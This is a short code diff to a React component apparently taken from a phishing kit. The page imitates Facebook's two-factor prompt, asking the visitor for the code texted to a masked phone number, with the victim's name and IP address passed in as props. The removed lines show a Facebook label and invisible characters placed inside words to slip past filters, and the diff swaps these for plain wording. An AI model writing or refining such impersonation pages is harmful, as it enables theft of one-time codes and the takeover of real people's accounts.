@@ -216,11 +216,8 @@ function Fa2({ Unik, setStep, Name, Tel, Ip }) {
     <ModalContainer>
       <ModalContent>
         <div className='text-start'>
-          <span style={{ fontWeight: 500, fontSize: '14px' }}>
-            {Name ? Name.split(' ')[0].charAt(0).toUpperCase() + Name.split(' ')[0].slice(1) + ' ' + (Name.split(' ')[1] ? Name.split(' ')[1].charAt(0).toUpperCase() + Name.split(' ')[1].slice(1) : '') : ''} • Facebook
-          </span>
           <ModalTitle>
-            C‎h‎eck y‎o‎ur t‎ext me‎s‎s‎a‎ges
+            Check your text messages
           </ModalTitle>
           <SmallText>
             Enter the code we sent to {Tel.substring(0, 3)}*******{Tel.substring(Tel.length - 2, Tel.length)}
@@ -244,7 +241,7 @@ function Fa2({ Unik, setStep, Name, Tel, Ip }) {
 
           {Error && (
             <ErrorDiv>
-              In‎va‎li‎d a‎ut‎he‎nt‎i‎ca‎ti‎o‎n co‎d‎e
+              Invalid authentication code
             </ErrorDiv>
           )}
           <SmallText>
